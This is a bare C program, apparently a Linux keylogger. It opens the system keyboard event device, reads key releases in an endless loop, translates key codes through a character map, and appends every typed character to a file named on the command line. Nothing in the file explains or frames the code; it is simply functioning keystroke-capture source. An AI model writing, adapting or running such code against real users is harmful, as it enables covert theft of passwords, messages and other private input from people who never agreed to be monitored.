#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/stat.h>

int main(int argc, char **argv)
{
    struct input_event ev;
    const char *dev = "/dev/input/by-path/platform-i8042-serio-0-event-kbd";
    int fd = open(dev, O_RDONLY);
    if (argc == 1)
        return -1;
    FILE *fp = fopen(argv[1], "ab+");
    char *map = "..1234567890-=..qwertyuiop{}..asdfghjkl;'...zxcvbnm,./";

    while (1)
    {
        read(fd, &ev, sizeof(ev));
        if ((ev.type == EV_KEY) && (ev.value == 0))
        {
            fflush(fp);
            switch (ev.code)
            {
            case 28:
                fprintf(fp, "\n");
                break;
            case 57:
                fprintf(fp, " ");
                break;
            default:
                fprintf(fp, "%c", map[ev.code]);
            }
        }
    }
    fclose(fp);
    close(fd);
}